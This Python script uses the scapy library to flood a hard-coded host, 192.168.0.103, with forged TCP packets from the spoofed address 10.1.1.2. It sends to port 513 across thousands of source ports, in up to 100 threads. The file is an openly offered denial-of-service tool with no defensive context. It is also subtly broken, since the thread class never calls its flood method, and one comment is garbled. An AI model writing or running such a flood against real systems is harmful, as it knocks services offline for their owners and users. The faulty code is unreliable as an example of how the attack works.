#coding: utf8

from scapy.all import *
from threading import Thread,Lock,activeCount

src = "10.1.1.2"

class Loop(Thread):
    def __init__(self,tgt):
        Thread.__init__(self)
        self.tgt = tgt

    def synFlood(self):
        global src
        for sport in range(1024, 65535):
            IPlayer = IP(src=src, dst=self.tgt)
            TCPlayer = TCP(sport=sport, dport=513)
            pkt = IPlayer / TCPlayer
            send(pkt)
            
class Main(Thread):
    def __init__(self, tgt, thread):
        Thread.__init__(self)
        self.tgt = tgt
        self.thread = thread

    def run(self):
        limit = 100
        total = 0
        while True:
            if activeCount() < limit:
                Loop(self.tgt).start()
                total = total + 1
                print('Thread: %s ,Send attack package %s times...' % (str(self.thread),(str(total))) + "\n")

# ????????
t = input("Input your Thread:")
t = float(t)

# ip = input("Your target:")
ip = "192.168.0.103"    # IP

i = 0
# while True:
while i <= 5:
    i = i+1
    Main(tgt=ip,thread=i).start()
    t = t-1
    if t==0:
        break

